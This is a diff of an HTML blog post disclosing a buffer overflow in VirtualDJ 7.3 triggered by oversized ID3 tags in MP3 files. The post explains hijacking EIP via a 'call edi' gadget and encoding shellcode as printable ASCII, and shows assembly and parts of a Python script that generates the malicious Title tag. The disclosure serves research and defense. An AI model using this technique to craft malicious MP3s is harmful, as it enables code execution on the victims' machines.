@@ -65,7 +65,7 @@
             <p>
                 <span 
                     class="post-key">Author</span><span
-                    class="post-val">Alexandro Sanchez</span>
+                    class="post-val">Alexandro Sanchez Bach</span>
                 <span
                     class="post-key">Date</span><span
                     class="post-val">2013-03-30</span>
@@ -73,30 +73,29 @@
             <p>I have found a buffer overflow vulnerability in <a href="http://www.virtualdj.com/">VirtualDJ Pro 7.3 and VirtualDJ Home 7.3</a> and possibly previous versions of this software. When the user enters a folder, VirtualDJ tries to retrieve all information from the ID3 tags of MP3 files inside such as <em>Title</em>, <em>Album</em>, and <em>Artist</em> and stores it in a buffer. After that, a second buffer of length 4096 is allocated in the stack and only the characters <code>[A-Z]</code> from the first buffer will be copied to it. According to the ID3 v2.x standard, these tags can have a length greater than 4096; therefore it is possible to produce a buffer overflow in this second buffer. At the time when the buffer overflow happens and the program reaches the <code>retn</code> instruction, the <code>edi</code> register points to the first buffer.</p>
 <p>We cannot assign the <code>eip</code> the address of the first buffer directly since it contains characters which are not in range A-Z. However if we take into account the previous information, we can do this indirectly: We write in the bytes 4100:4104 of the title <code>"FSFD"</code>. After the buffer overflows occurs we get <code>eip == 0×44465346 == "FSFD"</code>. At this address (inside <em>urlmon.dll</em>) we find a <code>call edi</code> instruction and so the bytes in the first buffer will be executed. Now we face another problem. VirtualDJ has inserted a 0xC3 byte (<code>retn</code>) before each non-printable ASCII character in the first buffer and we cannot execute the shellcode directly. We can solve this by pushing into the stack the bytes of the shellcode using only printable ASCII characters. Let me explain:</p>
 <p>Instead of pushing the bytes 0xB8, 0xFF, 0xEF, 0xFF (FFEFFFB8h) directly, we can do exactly the same using only printable ASCII characters by using the string <code>"%@@@@%????-R@D@-R@D@-R@D@-R?C?P"</code>:</p>
-<div class="codehilite"><pre><span></span><span class="nf">and</span>   <span class="no">eax</span><span class="p">,</span> <span class="mi">40404040</span><span class="no">h</span>   <span class="c">; 25 40 40 40 40  == &quot;%@@@@&quot;</span>
-<span class="nf">and</span>   <span class="no">eax</span><span class="p">,</span> <span class="mi">3</span><span class="no">F3F3F3Fh</span>   <span class="c">; 25 3F 3F 3F 3F  == &quot;%????&quot;  &lt;– eax == 0</span>
-<span class="nf">sub</span>   <span class="no">eax</span><span class="p">,</span> <span class="mi">40444052</span><span class="no">h</span>   <span class="c">; 2D 40 44 40 52  == &quot;-R@D@&quot;</span>
-<span class="nf">sub</span>   <span class="no">eax</span><span class="p">,</span> <span class="mi">40444052</span><span class="no">h</span>   <span class="c">; 2D 40 44 40 52  == &quot;-R@D@&quot;</span>
-<span class="nf">sub</span>   <span class="no">eax</span><span class="p">,</span> <span class="mi">40444052</span><span class="no">h</span>   <span class="c">; 2D 40 44 40 52  == &quot;-R@D@&quot;</span>
-<span class="nf">sub</span>   <span class="no">eax</span><span class="p">,</span> <span class="mi">3</span><span class="no">F433F52h</span>   <span class="c">; 2D 3F 43 3F 52  == &quot;-R?C?&quot;  &lt;– eax == 0xFFEFFFB8</span>
-<span class="nf">push</span>  <span class="no">eax</span>              <span class="c">; 50              == &quot;P&quot;</span>
-</pre></div>
-
+<div class="codehilite"><pre><span></span><code><span class="nf">and</span><span class="w">   </span><span class="no">eax</span><span class="p">,</span><span class="w"> </span><span class="mi">40404040</span><span class="no">h</span><span class="w">   </span><span class="c1">; 25 40 40 40 40  == &quot;%@@@@&quot;</span>
+<span class="nf">and</span><span class="w">   </span><span class="no">eax</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="no">F3F3F3Fh</span><span class="w">   </span><span class="c1">; 25 3F 3F 3F 3F  == &quot;%????&quot;  &lt;– eax == 0</span>
+<span class="nf">sub</span><span class="w">   </span><span class="no">eax</span><span class="p">,</span><span class="w"> </span><span class="mi">40444052</span><span class="no">h</span><span class="w">   </span><span class="c1">; 2D 40 44 40 52  == &quot;-R@D@&quot;</span>
+<span class="nf">sub</span><span class="w">   </span><span class="no">eax</span><span class="p">,</span><span class="w"> </span><span class="mi">40444052</span><span class="no">h</span><span class="w">   </span><span class="c1">; 2D 40 44 40 52  == &quot;-R@D@&quot;</span>
+<span class="nf">sub</span><span class="w">   </span><span class="no">eax</span><span class="p">,</span><span class="w"> </span><span class="mi">40444052</span><span class="no">h</span><span class="w">   </span><span class="c1">; 2D 40 44 40 52  == &quot;-R@D@&quot;</span>
+<span class="nf">sub</span><span class="w">   </span><span class="no">eax</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="no">F433F52h</span><span class="w">   </span><span class="c1">; 2D 3F 43 3F 52  == &quot;-R?C?&quot;  &lt;– eax == 0xFFEFFFB8</span>
+<span class="nf">push</span><span class="w">  </span><span class="no">eax</span><span class="w">              </span><span class="c1">; 50              == &quot;P&quot;</span>
+</code></pre></div>
 
 <p>Once all the bytes of the shellcode are pushed into the stack (in inverse order) we use <code>push esp</code> (0×54) and <code>retn</code> (0xC3) to run the shellcode. Obviously, it does not matter if VirtualDJ pushes another 0xC3 byte before this one.</p>
 <p>This is a pretty serious vulnerability since VirtualDJ is considered the #1 software for mixing music with millions of downloads around the world. By exploiting this vulnerability it would be possible to spread quickly a malware just by uploading a malicious MP3 file in a popular site. Even worse, this file might not be a suspicious file for antivirus software. Note how the 4096 padding bytes could be replaced by something apparently harmless such as the real title of the MP3 file followed by a lot of spaces.</p>
-<div class="codehilite"><pre><span></span><span class="c1">#Exploit: VirtualDJ Pro/Home &lt;=7.3 Buffer Overflow Vulnerability </span>
+<div class="codehilite"><pre><span></span><code><span class="c1">#Exploit: VirtualDJ Pro/Home &lt;=7.3 Buffer Overflow Vulnerability </span>
 <span class="c1">#By: Alexandro Sanchez Bach | functionmixer.blogspot.com </span>
 <span class="c1">#More info: http://www.youtube.com/watch?v=PJeaWqMJRm0</span>
 
-<span class="kn">import</span> <span class="nn">string</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">string</span>
 
-<span class="k">def</span> <span class="nf">unicodeHex</span><span class="p">(</span><span class="n">c</span><span class="p">):</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">unicodeHex</span><span class="p">(</span><span class="n">c</span><span class="p">):</span>
     <span class="n">c</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">))[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">upper</span><span class="p">()</span>
     <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">c</span><span class="p">)</span><span class="o">==</span><span class="mi">1</span><span class="p">:</span> <span class="n">c</span> <span class="o">=</span> <span class="s2">&quot;0&quot;</span><span class="o">+</span><span class="n">c</span>
     <span class="k">return</span> <span class="n">c</span><span class="o">+</span><span class="s2">&quot;00&quot;</span>
 
-<span class="k">def</span> <span class="nf">movEAX</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">movEAX</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
     <span class="c1">#Arrays </span>
     <span class="n">s</span> <span class="o">=</span> <span class="nb">map</span><span class="p">(</span><span class="nb">ord</span><span class="p">,</span> <span class="nb">list</span><span class="p">(</span><span class="n">s</span><span class="p">))</span>
     <span class="n">inst</span> <span class="o">=</span> <span class="p">[]</span>
@@ -152,10 +151,9 @@
 <span class="n">exploit</span> <span class="o">+=</span>  <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">4100</span> <span class="o">-</span> <span class="n">c</span><span class="p">)</span>
 <span class="n">exploit</span> <span class="o">+=</span> <span class="s2">&quot;FSFD&quot;</span>
 
-<span class="k">print</span> <span class="n">exploit</span>
+<span class="nb">print</span> <span class="n">exploit</span>
 <span class="c1">#Paste the generated code in the tag &#39;Title&#39; of the MP3 file.</span>
-</pre></div>
-
+</code></pre></div>
 
 <p>You can see a demo of this proof of concept at: https://www.youtube.com/watch?v=PJeaWqMJRm0.</p>
 <h2 id="log">Log</h2>
